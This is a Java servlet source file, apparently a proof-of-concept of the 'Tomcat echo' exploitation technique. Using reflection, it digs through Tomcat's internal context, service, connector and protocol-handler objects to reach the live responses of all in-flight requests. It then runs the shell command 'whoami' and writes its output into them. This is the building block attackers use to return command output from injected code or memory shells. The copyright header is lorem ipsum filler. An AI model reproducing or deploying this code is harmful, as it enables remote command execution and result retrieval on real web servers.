/*
 * Copyright (c) 2024. Lorem ipsum dolor sit amet, consectetur adipiscing elit.
 * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.
 * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.
 * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.
 * Vestibulum commodo. Ut rhoncus gravida arcu.
 */

package com.y5neko.TomcatEcho;

import org.apache.catalina.Context;
import org.apache.catalina.Service;
import org.apache.catalina.connector.Connector;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardService;
import org.apache.coyote.AbstractProtocol;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;
import org.apache.coyote.Response;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Modifier;
import java.util.ArrayList;
@WebServlet("/demoServlet")
public class demoServlet extends HttpServlet {
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
        try {
            Field context = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");
            context.setAccessible(true);
            ApplicationContext ApplicationContext = (ApplicationContext)context.get(standardContext);
            Field service = Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service");
            service.setAccessible(true);
            StandardService standardService = (StandardService)service.get(ApplicationContext);
            Field connectors = Class.forName("org.apache.catalina.core.StandardService").getDeclaredField("connectors");
            connectors.setAccessible(true);
            Connector[] connector = (Connector[])connectors.get(standardService);
            Field protocolHandler = Class.forName("org.apache.catalina.connector.Connector").getDeclaredField("protocolHandler");
            protocolHandler.setAccessible(true);
//            AbstractProtocol abstractProtocol = (AbstractProtocol)protocolHandler.get(connector[0]);
            Class<?>[] AbstractProtocol_list = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredClasses();
            for (Class<?> aClass : AbstractProtocol_list) {
                if (aClass.getName().length()==52){
                    java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler",null);
                    getHandlerMethod.setAccessible(true);
                    Field globalField = aClass.getDeclaredField("global");
                    globalField.setAccessible(true);
                    org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(connector[0].getProtocolHandler(), null));
                    Field processors = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
                    processors.setAccessible(true);
                    java.util.List<RequestInfo> RequestInfo_list = (java.util.List<RequestInfo>) processors.get(requestGroupInfo);
                    Field req = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
                    req.setAccessible(true);
                    for (RequestInfo requestInfo : RequestInfo_list) {
                        org.apache.coyote.Request request1 = (org.apache.coyote.Request )req.get(requestInfo);
                        org.apache.catalina.connector.Request request2 = ( org.apache.catalina.connector.Request)request1.getNote(1);
                        org.apache.catalina.connector.Response response2 = request2.getResponse();
                        response2.getWriter().write("111");
                        InputStream whoami = Runtime.getRuntime().exec("whoami").getInputStream();
//                        BufferedInputStream bufferedInputStream = new BufferedInputStream(whoami);
                        BufferedInputStream bis = new BufferedInputStream(whoami);
                        int b ;
                        while ((b = bis.read())!=-1){
                            response2.getWriter().write(b);
                        }
                    }
                }
            }
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        }
    }
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        this.doPost(request, response);
    }
}